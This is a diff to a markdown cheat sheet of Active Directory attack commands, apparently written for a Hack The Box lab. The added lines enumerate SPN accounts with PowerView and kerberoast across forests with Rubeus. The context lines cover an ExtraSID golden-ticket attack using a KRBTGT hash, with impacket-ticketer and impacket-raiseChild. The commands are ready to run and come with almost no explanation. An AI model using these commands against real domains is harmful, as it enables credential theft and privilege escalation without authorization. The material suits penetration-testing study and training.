@@ -10,6 +10,12 @@
 Import-Module activedirectory
 Get-ADTrust -Filter *
 ```
+### Enumerating SPNs in Parent Domain
+```
+Powerview
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL(Parent Domain) | select SamAccountName
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL(Parent Domain) -Identity mssqlsvc |select samaccountname,memberof
+```
 ### Child Domain 
 IntraForest = True
 ### ExtraSID Attack
@@ -45,4 +51,8 @@ impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f(KRBTGT hash for the c
 automatic way:  
 ```
 impacket-raiseChild -target-exec 172.16.5.5(dc ip of Parent Domain) LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm(an administrative user in the child domain)
+```
+### Cross-Forest Kerberoasting
+```
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL(parent domain) /user:mssqlsvc(optional) /nowrap
 ```
